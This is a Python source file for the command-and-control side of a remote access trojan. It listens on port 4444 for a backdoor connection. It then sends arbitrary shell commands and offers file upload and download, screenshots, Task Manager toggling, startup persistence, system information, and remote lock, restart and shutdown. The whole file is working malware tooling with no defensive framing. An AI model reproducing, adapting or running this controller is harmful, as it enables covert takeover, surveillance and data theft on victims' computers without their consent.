import os
import json
import socket
import base64
import datetime
 
class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)

        print("[+] Waiting for connections.")
        self.connection, address = listener.accept()
        print("[+] Got a connection from {}".format(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)    
        if command[0] == "exit" or command[0] == "e" or self.is_shutdown_type(command):
            self.connection.close()
            exit()
 
        return self.reliable_receive()

    def is_shutdown_type(self, command):
        return ((command[0] == "cs" or command[0] == "changestate") and command[1] == "2") or ((command[0] == "cs" or command[0] == "changestate") and command[1] == "3")

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    
    def take_screenshot(self):
        try:
            screenshot = self.reliable_receive()
            current_path = os.path.abspath(os.getcwd())
            current_time = datetime.datetime.now()

            file_name = "\{}-{}-{}-{}-{}.jpg".format(current_time.month, current_time.day, current_time.hour, current_time.minute, current_time.second)
            screenshot.save((current_path + file_name))

            print("[+] Successfully managed to save the screenshot, saved to: {}".format(current_path + file_name))
        except Exception:
            self.reliable_receive()

    def help_menu(self):
        print("\nH/help: Help menu")
        print("D path: Download a file.")
        print("U path: Upload a file.")
        print("S: Take a Screenshot.")                
        print("TM: Enable/Disable Task Manager.")
        print("SI: Get System information")
        print("ST: Add to Startup.")
        print("RST: Remove from Startup.")
        print("CS/changestate (1): Lock the System.")
        print("CS/changestate (2): Restart the System")
        print("CS/changestate (3): Shutdown the System.")
        print("E/exit: Exit the program.")
        print("\nYou can execute any cmd command.\n")

    def run(self):
        self.help_menu()
        while True:
            command = input(">> ").lower()
            command = command.split(" ")
 
            try:
                if command[0] == "h" or command[0] == "help":
                    self.help_menu()
                    continue
                elif command[0] == "u":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)
                if command[0] == "d" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
                elif command[0] == "s":
                    self.take_screenshot()
            except Exception as e:
                result = "\n[-] Error during command execution: {}".format(e)
 
            print(result)
 
my_listener = Listener("192.168.19.1", 4444)
my_listener.run()